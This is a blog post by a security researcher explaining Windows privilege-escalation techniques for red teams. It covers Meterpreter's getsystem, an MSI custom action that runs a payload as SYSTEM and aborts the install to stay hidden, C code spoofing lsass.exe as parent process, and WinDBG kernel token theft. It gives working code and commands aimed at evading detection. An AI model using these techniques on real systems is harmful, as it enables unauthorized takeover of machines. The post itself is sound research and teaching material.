@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    
+    <title>Alternative methods of becoming SYSTEM - XPN InfoSec Blog</title>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <!--Description-->
+    
+        <meta name="description" content="For many pentesters, Meterpreter&#39;s getsystem command has become the default method of gaining SYSTEM account privileges, but have you ever have wondered just how this works behind the scenes? In this post I will show the details of how this technique works, and explore a couple of methods which are not quite as popular, but may help evade detection on those tricky redteam engagements. Meterpreter&#39;s &#34;getsystem&#34; Most of you will have used the getsystem module in Meterpreter before. For those tha">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="Adam Chester">
+    
+
+    <!--Favicon-->
+    
+      <link rel="icon" href="images/favicon.ico">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="Alternative methods of becoming SYSTEM"/>
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="XPN InfoSec Blog"/>
+
+    <!--Page Cover-->
+    
+        <meta property="og:image" content="https://res.cloudinary.com/xpnsec/image/upload/images/2017/11/warp.jpg" />
+    
+
+    <meta name="twitter:site" content="@_xpn_"/>
+<meta name="twitter:creator" content="@_xpn_"/>
+
+    <meta name="twitter:card" content="summary_large_image"/>
+    <meta name="twitter:title" content="@_xpn_ - Alternative methods of becoming SYSTEM"/>
+    <meta name="twitter:image" content="https://res.cloudinary.com/xpnsec/image/upload/images/2017/11/warp.jpg"/>
+
+<meta name="twitter:url" content="https://blog.xpnsec.com/becoming-system/index.html"/>
+
+    <meta name="theme-color" content="#ffffff">
+    <link href='https://fonts.googleapis.com/css?family=Roboto:400,300,700|Noto+Serif:400,400italic,700,700italic' rel='stylesheet' type='text/css'>
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,700" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.17.1/themes/prism.min.css" rel="stylesheet" />
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/sass/main.css">
+
+
+    <!-- Google Analytics -->
+    
+    <script>
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+                    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+                m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+        ga('create', 'UA-93082799-1', 'auto');
+        ga('send', 'pageview');
+
+    </script>
+
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/styles/default.min.css" integrity="sha384-zhIsEafzyQWHSoMCQ4BfT8ZlRXQyIFwAHAJn32PNdsb8n6tVysGZSLpEEIvCskw4" crossorigin="anonymous">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/highlight.min.js" integrity="sha384-vG5ueWbnY1VP7nl03G97FIV56vNtYfp+rm3tvRLHeQZhRzq1kLd1nZZhYeQ+00u7" crossorigin="anonymous"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js" integrity="sha256-0rguYS0qgS6L4qVzANq4kjxPLtvnp5nn2nB5G1lWRv4=" crossorigin="anonymous"></script>
+    <script src="https://kit.fontawesome.com/26753e0838.js"></script>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/rss.xml" title="XPN InfoSec Blog" type="application/rss+xml">
+</head>
+
+
+<body id="top">
+  <div class="lateral">
+    <aside class="author">
+      <a href="https://blog.xpnsec.com"><img class="profile-image" src="/images/profile-image.jpg" alt="avatar" /></a>
+      <p class="title">XPN</p>
+      <p class="name">Adam Chester</p>
+      <p class="about">Hacker and Infosec Researcher</p>
+      <p class="link"><a href="/about" title="About">About Me</a></p>
+      <ul class="social">
+        <li><a href="https://twitter.com/_xpn_" target="_blank"><i class="fab fa-twitter" aria-hidden="true"></i></a></li>
+        <li><a href="https://www.linkedin.com/in/xpn" target="_blank"><i class="fab fa-linkedin" aria-hidden="true"></i></a></li>
+        <li><a href="mailto:xpnsec[at]protonmail.com" target="_blank"><i class="fas fa-envelope" aria-hidden="true"></i></a></li>
+        <li><a href="https://github.com/xpn" target="_blank"><i class="fab fa-github" aria-hidden="true"></i></a></li>
+        <li><a href="https://blog.xpnsec.com/rss/" target="_blank"><i class="fas fa-rss"></i></a></li>
+      </ul>
+    </aside>
+  </div>
+  <div class="home-template home">
+    <!--[if lt IE 8]>
+      <p class="browsehappy">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/" target="_blank" rel="noopener">upgrade your browser</a> to improve your experience.</p>
+    <![endif]-->
+    <header class="site-header">   
+      <h2><a class="logo ir" href="https://blog.xpnsec.com" title="XPN InfoSec Blog">XPN InfoSec Blog</a></h2>
+    </header>
+    <div class="container clearfix">
+      <main class="content" role="main">
+        <div  class="post-template">
+  <article class="post">
+    <a class="btn" href="https://blog.xpnsec.com" title="Back to homepage">« Back to home</a>
+
+
+      <h1 itemprop="name">
+        <a href="/becoming-system/">Alternative methods of becoming SYSTEM</a>
+      </h1>
+
+
+<footer class="post-info">
+  Posted on 
+      <span class="post-meta">
+        <time>
+          2017-11-20
+        </time>
+        
+          <span>Tagged in </span>
+        
+        
+        <a href="/tags/redteam/" class="button small">redteam</a>, <a href="/tags/windows/" class="button small">windows</a>, <a href="/tags/meterpreter/" class="button small">meterpreter</a>
+      </span>
+
+  
+
+  </footer>
+
+
+<p>For many pentesters, Meterpreter’s <code>getsystem</code> command has become the default method of gaining SYSTEM account privileges, but have you ever have wondered just how this works behind the scenes?</p>
+<p>In this post I will show the details of how this technique works, and explore a couple of methods which are not quite as popular, but may help evade detection on those tricky redteam engagements.</p>
+<h2 id="Meterpreter’s-“getsystem”"><a href="#Meterpreter’s-“getsystem”" class="headerlink" title="Meterpreter’s “getsystem”"></a>Meterpreter’s “getsystem”</h2><p>Most of you will have used the <code>getsystem</code> module in Meterpreter before. For those that haven’t, <code>getsystem</code> is a module offered by the Metasploit-Framework which allows an administrative account to escalate to the local SYSTEM account, usually from local Administrator.</p>
+<p>Before continuing we first need to understand a little on how a process can impersonate another user. Impersonation is a useful method provided by Windows in which a process can impersonate another user’s security context. For example, if a process acting as a FTP server allows a user to authenticate and only wants to allow access to files owned by a particular user, the process can impersonate that user account and allow Windows to enforce security.</p>
+<p>To facilitate impersonation, Windows exposes numerous native API’s to developers, for example:</p>
+<ul>
+<li>ImpersonateNamedPipeClient</li>
+<li>ImpersonateLoggedOnUser</li>
+<li>ReturnToSelf</li>
+<li>LogonUser</li>
+<li>OpenProcessToken</li>
+</ul>
+<p>Of these, the <code>ImpersonateNamedPipeClient</code> API call is key to the <code>getsystem</code> module’s functionality, and takes credit for how it achieves its privilege escalation. This API call allows a process to impersonate the access token of another process which connects to a named pipe and performs a write of data to that pipe (that last requirement is important ;). For example, if a process belonging to “victim” connects and writes to a named pipe belonging to “attacker”, the attacker can call <code>ImpersonateNamedPipeClient</code> to retrieve an impersonation token belonging to “victim”, and therefore impersonate this user. Obviously, this opens up a huge security hole, and for this reason a process must hold the <code>SeImpersonatePrivilege</code> privilege.</p>
+<p>This privilege is by default only available to a number of high privileged users:</p>
+<p><img src="https://res.cloudinary.com/xpnsec/image/upload/images/2017/11/SeImpersonatePrivilege.png" alt="SeImpersonatePrivilege"></p>
+<p>This does however mean that a local Administrator account can use <code>ImpersonateNamedPipeClient</code>, which is exactly how <code>getsystem</code> works:</p>
+<ol>
+<li><code>getsystem</code> creates a new Windows service, set to run as SYSTEM, which when started connects to a named pipe.</li>
+<li><code>getsystem</code> spawns a process, which creates a named pipe and awaits a connection from the service.</li>
+<li>The Windows service is started, causing a connection to be made to the named pipe.</li>
+<li>The process receives the connection, and calls <code>ImpersonateNamedPipeClient</code>, resulting in an impersonation token being created for the SYSTEM user.</li>
+</ol>
+<p>All that is left to do is to spawn cmd.exe with the newly gathered SYSTEM impersonation token, and we have a SYSTEM privileged process.</p>
+<p>To show how this can be achieved outside of the Meterpreter-Framework, I’ve previously released a simple tool which will spawn a SYSTEM shell when executed. This tool follows the same steps as above, and can be found on my github account <a href="https://github.com/xpn/getsystem-offline" target="_blank" rel="noopener">here</a>.</p>
+<p>To see how this works when executed, a demo can be found below:</p>
+<div class="video-container"><iframe src="https://www.youtube.com/embed/5sxJ4bJT8DM" frameborder="0" loading="lazy" allowfullscreen></iframe></div>
+
+<p>Now that we have an idea just how <code>getsystem</code> works, let’s look at a few alternative methods which can allow you to grab SYSTEM.</p>
+<h2 id="MSIExec-method"><a href="#MSIExec-method" class="headerlink" title="MSIExec method"></a>MSIExec method</h2><p>For anyone unlucky enough to follow me on Twitter, you may have seen my recent tweet about using a .MSI package to spawn a SYSTEM process:</p>
+<blockquote>
+<p>There is something nice about embedding a Powershell one-liner in a .MSI, nice alternative way to execute as SYSTEM :) <a href="https://t.co/cXAK6ntpcJ" target="_blank" rel="noopener">pic.twitter.com/cXAK6ntpcJ</a><br>&mdash; Adam (@<em>xpn</em>) <a href="https://twitter.com/_xpn_/status/927671297466871808?ref_src=twsrc%5Etfw" target="_blank" rel="noopener">November 6, 2017</a></p>
+</blockquote>
+<p>This came about after a bit of research into the DOQU 2.0 malware I was doing, in which this APT actor was delivering malware packaged within a MSI file.</p>
+<p>It turns out that a benefit of launching your code via an MSI are the SYSTEM privileges that you gain during the install process. To understand how this works, we need to look at <a href="http://wixtoolset.org/" target="_blank" rel="noopener">WIX Toolset</a>, which is an open source project used to create MSI files from XML build scripts.</p>
+<p>The WIX Framework is made up of several tools, but the two that we will focus on are:</p>
+<ul>
+<li>candle.exe - Takes a .WIX XML file and outputs a .WIXOBJ</li>
+<li>light.exe - Takes a .WIXOBJ and creates a .MSI</li>
+</ul>
+<p>Reviewing the documentation for WIX, we see that <code>custom actions</code> are provided, which give the developer a way to launch scripts and processes during the install process. Within the <a href="http://wixtoolset.org/documentation/manual/v3/xsd/wix/customaction.html" target="_blank" rel="noopener">CustomAction</a> documentation, we see something interesting:</p>
+<p><img src="https://res.cloudinary.com/xpnsec/image/upload/images/2017/11/customaction.png" alt="customaction"></p>
+<p>This documents a simple way in which a MSI can be used to launch processes as SYSTEM, by providing a custom action with an <code>Impersonate</code> attribute set to <code>false</code>.</p>
+<p>When crafted, our WIX file will look like this:</p>
+
+<script src="https://gist.github.com/xpn/d1ef20dfd266053227d3e992ae84c64e.js"></script>
+
+
+<p>A lot of this is just boilerplate to generate a MSI, however the parts to note are our custom actions:</p>
+<pre><code>&lt;Property Id=&quot;cmdline&quot;&gt;powershell...&lt;/Property&gt;
+&lt;CustomAction Id=&quot;SystemShell&quot; Execute=&quot;deferred&quot; Directory=&quot;TARGETDIR&quot; ExeCommand=&apos;[cmdline]&apos; Return=&quot;ignore&quot; Impersonate=&quot;no&quot;/&gt;</code></pre><p>This custom action is responsible for executing our provided <code>cmdline</code> as SYSTEM (note the <code>Property</code> tag, which is a nice way to get around the length limitation of the <code>ExeCommand</code> attribute for long Powershell commands).</p>
+<p>Another trick which is useful is to ensure that the install fails after our command is executed, which will stop the installer from adding a new entry to “Add or Remove Programs” which is shown here by executing invalid VBScript:</p>
+<pre><code>&lt;CustomAction Id=&quot;FailInstall&quot; Execute=&quot;deferred&quot; Script=&quot;vbscript&quot; Return=&quot;check&quot;&gt;
+  invalid vbs to fail install
+&lt;/CustomAction&gt;</code></pre><p>Finally, we have our <code>InstallExecuteSequence</code> tag, which is responsible for executing our custom actions in order:</p>
+<pre><code>&lt;InstallExecuteSequence&gt;
+  &lt;Custom Action=&quot;SystemShell&quot; After=&quot;InstallInitialize&quot;&gt;&lt;/Custom&gt;
+  &lt;Custom Action=&quot;FailInstall&quot; Before=&quot;InstallFiles&quot;&gt;&lt;/Custom&gt;
+&lt;/InstallExecuteSequence&gt;</code></pre><p>So, when executed:</p>
+<ol>
+<li>Our first custom action will be launched, forcing our payload to run as the SYSTEM account.</li>
+<li>Our second custom action will be launched, causing some invalid VBScript to be executed and stop the install process with an error.</li>
+</ol>
+<p>To compile this into a MSI we save the above contents as a file called “msigen.wix”, and use the following commands:</p>
+<pre><code>candle.exe msigen.wix
+light.exe msigen.wixobj</code></pre><p>Finally, execute the MSI file to execute our payload as SYSTEM:</p>
+<p><img src="https://res.cloudinary.com/xpnsec/image/upload/images/2017/11/shell3.gif" alt="shell3"></p>
+<h2 id="PROC-THREAD-ATTRIBUTE-PARENT-PROCESS-method"><a href="#PROC-THREAD-ATTRIBUTE-PARENT-PROCESS-method" class="headerlink" title="PROC_THREAD_ATTRIBUTE_PARENT_PROCESS method"></a>PROC_THREAD_ATTRIBUTE_PARENT_PROCESS method</h2><p>This method of becoming SYSTEM was actually revealed to me via a post from James Forshaw’s <a href="https://tyranidslair.blogspot.co.uk/2017/08/the-art-of-becoming-trustedinstaller.html" target="_blank" rel="noopener">walkthrough</a> of how to become “Trusted Installer”.</p>
+<p>Again, if you listen to my ramblings on Twitter, I recently mentioned this technique a few weeks back:</p>
+<blockquote>
+<p>Loving <a href="https://twitter.com/tiraniddo?ref_src=twsrc%5Etfw" target="_blank" rel="noopener">@tiraniddo</a> New-Win32Process cmdlet for a nice clean way to grab SYSTEM user account.  <a href="https://t.co/bEFYocOAKn" target="_blank" rel="noopener">https://t.co/bEFYocOAKn</a><a href="https://t.co/aBzzho3jKS" target="_blank" rel="noopener">pic.twitter.com/aBzzho3jKS</a><br>&mdash; Adam (@<em>xpn</em>) <a href="https://twitter.com/_xpn_/status/926092979433066496?ref_src=twsrc%5Etfw" target="_blank" rel="noopener">November 2, 2017</a></p>
+</blockquote>
+<p>How this technique works is by leveraging the <code>CreateProcess</code> Win32 API call, and using its support for assigning the parent of a newly spawned process via the <code>PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</code> attribute.</p>
+<p>If we review the documentation of this setting, we see the following:</p>
+<p><img src="https://res.cloudinary.com/xpnsec/image/upload/images/2017/11/PROC_THREAT_ATTRIBUTE_PARENT_PROCESS.png" alt="PROC_THREAT_ATTRIBUTE_PARENT_PROCESS"></p>
+<p>So, this means if we set the parent process of our newly spawned process, we will inherit the process token. This gives us a cool way to grab the SYSTEM account via the process token.</p>
+<p>We can create a new process and set the parent with the following code:</p>
+<pre><code>int pid;
+HANDLE pHandle = NULL;
+STARTUPINFOEXA si;
+PROCESS_INFORMATION pi;
+SIZE_T size;
+BOOL ret;
+
+// Set the PID to a SYSTEM process PID
+pid = 555;
+
+EnableDebugPriv();
+
+// Open the process which we will inherit the handle from
+if ((pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid)) == 0) {
+    printf(&quot;Error opening PID %d\n&quot;, pid);
+    return 2;
+}
+
+// Create our PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute
+ZeroMemory(&amp;si, sizeof(STARTUPINFOEXA));
+
+InitializeProcThreadAttributeList(NULL, 1, 0, &amp;size);
+si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
+    GetProcessHeap(),
+    0,
+    size
+);
+InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &amp;size);
+UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;pHandle, sizeof(HANDLE), NULL, NULL);
+
+si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
+
+// Finally, create the process
+ret = CreateProcessA(
+    &quot;C:\\Windows\\system32\\cmd.exe&quot;, 
+    NULL,
+    NULL, 
+    NULL, 
+    true, 
+    EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, 
+    NULL,
+    NULL, 
+    reinterpret_cast&lt;LPSTARTUPINFOA&gt;(&amp;si), 
+    &amp;pi
+);
+
+if (ret == false) {
+    printf(&quot;Error creating new process (%d)\n&quot;, GetLastError());
+    return 3;
+}</code></pre><p>When compiled, we see that we can launch a process and inherit an access token from a parent process running as SYSTEM such as lsass.exe:</p>
+<p><img src="https://res.cloudinary.com/xpnsec/image/upload/images/2017/11/parentsystem2.gif" alt="parentsystem2"></p>
+<p>The source for this technique can be found <a href="https://gist.github.com/xpn/a057a26ec81e736518ee50848b9c2cd6" target="_blank" rel="noopener">here</a>.</p>
+<p>Alternatively, <a href="https://www.powershellgallery.com/packages/NtObjectManager/1.0.1" target="_blank" rel="noopener">NtObjectManager</a> provides a nice easy way to achieve this using Powershell:</p>
+<pre><code>New-Win32Process cmd.exe -CreationFlags Newconsole -ParentProcess (Get-NtProcess -Name lsass.exe)</code></pre><h2 id="Bonus-Round-Getting-SYSTEM-via-the-Kernel"><a href="#Bonus-Round-Getting-SYSTEM-via-the-Kernel" class="headerlink" title="Bonus Round: Getting SYSTEM via the Kernel"></a>Bonus Round: Getting SYSTEM via the Kernel</h2><p>OK, so this technique is just a bit of fun, and not something that you are likely to come across in an engagement… but it goes some way to show just how Windows is actually managing process tokens.</p>
+<p>Often you will see Windows kernel privilege escalation exploits tamper with a process structure in the kernel address space, with the aim of updating a process token. For example, in the popular MS15-010 privilege escalation exploit (found on exploit-db <a href="https://www.exploit-db.com/exploits/37098/" target="_blank" rel="noopener">here</a>), we can see a number of references to manipulating access tokens.</p>
+<p>For this analysis, we will be using WinDBG on a Windows 7 x64 virtual machine in which we will be looking to elevate the privileges of our cmd.exe process to SYSTEM by manipulating kernel structures. (I won’t go through how to set up the Kernel debugger connection as this is covered in multiple <a href="http://lmgtfy.com/?q=Virtualbox+windows+kernel+windbg" target="_blank" rel="noopener">places</a> for multiple hypervisors.)</p>
+<p>Once you have WinDBG connected, we first need to gather information on our running process which we want to elevate to SYSTEM. This can be done using the <code>!process</code> command:</p>
+<pre><code>!process 0 0 cmd.exe</code></pre><p>Returned we can see some important information about our process, such as the number of open handles, and the process environment block address:</p>
+<pre><code>PROCESS fffffa8002edd580
+    SessionId: 1  Cid: 0858    Peb: 7fffffd4000  ParentCid: 0578
+    DirBase: 09d37000  ObjectTable: fffff8a0012b8ca0  HandleCount:  21.
+    Image: cmd.exe</code></pre><p>For our purpose, we are interested in the provided PROCESS address (in this example <code>fffffa8002edd580</code>), which is actually a pointer to an <code>EPROCESS</code> structure. The <code>EPROCESS</code> structure (documented by Microsoft <a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff544273.aspx" target="_blank" rel="noopener">here</a>) holds important information about a process, such as the process ID and references to the process threads.</p>
+<p>Amongst the many fields in this structure is a pointer to the process’s access token, defined in a <code>TOKEN</code> structure. To view the contents of the token, we first must calculate the <code>TOKEN</code> address. On Windows 7 x64, the process <code>TOKEN</code> is located at offset <code>0x208</code>, which differs throughout each version (and potentially service pack) of Windows. We can retrieve the pointer with the following command:</p>
+<pre><code>kd&gt; dq fffffa8002edd580+0x208 L1</code></pre><p>This returns the token address as follows:</p>
+<pre><code>fffffa80`02edd788  fffff8a0`00d76c51</code></pre><p>As the token address is referenced within a <code>EX_FAST_REF</code> structure, we must <code>AND</code> the value to gain the true pointer address:</p>
+<pre><code>kd&gt; ? fffff8a0`00d76c51 &amp; ffffffff`fffffff0
+
+Evaluate expression: -8108884136880 = fffff8a0`00d76c50</code></pre><p>Which means that our true <code>TOKEN</code> address for cmd.exe is at <code>fffff8a000d76c50</code>. Next we can dump out the <code>TOKEN</code> structure members for our process using the following command:</p>
+<pre><code>kd&gt; !token fffff8a0`00d76c50</code></pre><p>This gives us an idea of the information held by the process token:</p>
+<pre><code>User: S-1-5-21-3262056927-4167910718-262487826-1001
+User Groups:
+ 00 S-1-5-21-3262056927-4167910718-262487826-513
+    Attributes - Mandatory Default Enabled
+ 01 S-1-1-0
+    Attributes - Mandatory Default Enabled
+ 02 S-1-5-32-544
+    Attributes - DenyOnly
+ 03 S-1-5-32-545
+    Attributes - Mandatory Default Enabled
+ 04 S-1-5-4
+    Attributes - Mandatory Default Enabled
+ 05 S-1-2-1
+    Attributes - Mandatory Default Enabled
+ 06 S-1-5-11
+    Attributes - Mandatory Default Enabled
+ 07 S-1-5-15
+    Attributes - Mandatory Default Enabled
+ 08 S-1-5-5-0-2917477
+    Attributes - Mandatory Default Enabled LogonId
+ 09 S-1-2-0
+    Attributes - Mandatory Default Enabled
+ 10 S-1-5-64-10
+    Attributes - Mandatory Default Enabled
+ 11 S-1-16-8192
+    Attributes - GroupIntegrity GroupIntegrityEnabled
+Primary Group: S-1-5-21-3262056927-4167910718-262487826-513
+Privs:
+ 19 0x000000013 SeShutdownPrivilege               Attributes -
+ 23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default
+ 25 0x000000019 SeUndockPrivilege                 Attributes -
+ 33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes -
+ 34 0x000000022 SeTimeZonePrivilege               Attributes -</code></pre><p>So how do we escalate our process to gain SYSTEM access? Well we just steal the token from another SYSTEM privileged process, such as lsass.exe, and splice this into our cmd.exe EPROCESS using the following:</p>
+<pre><code>kd&gt; !process 0 0 lsass.exe
+kd&gt; dq &lt;LSASS_PROCESS_ADDRESS&gt;+0x208 L1
+kd&gt; ? &lt;LSASS_TOKEN_ADDRESS&gt; &amp; FFFFFFFF`FFFFFFF0
+kd&gt; !process 0 0 cmd.exe
+kd&gt; eq &lt;CMD_EPROCESS_ADDRESS+0x208&gt; &lt;LSASS_TOKEN_ADDRESS&gt;</code></pre><p>To see what this looks like when run against a live system, I’ll leave you with a quick demo showing cmd.exe being elevated from a low level user, to SYSTEM privileges:</p>
+<div class="video-container"><iframe src="https://www.youtube.com/embed/wUIfTYSQOO4" frameborder="0" loading="lazy" allowfullscreen></iframe></div>
+  </article>
+</div>
+
+      </main> 
+    </div>
+    <footer class="main-footer">
+  <div class="container clearfix">
+    <a href="https://blog.xpnsec.com/rss/" title="RSS Feed"><i class="fa fa-rss"></i></a>
+  </div>
+</footer>
+
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    
+<script src="/js/skel.min.js"></script>
+
+    
+<script src="/js/main.js"></script>
+
+    </div>
+  </body>
+</html>
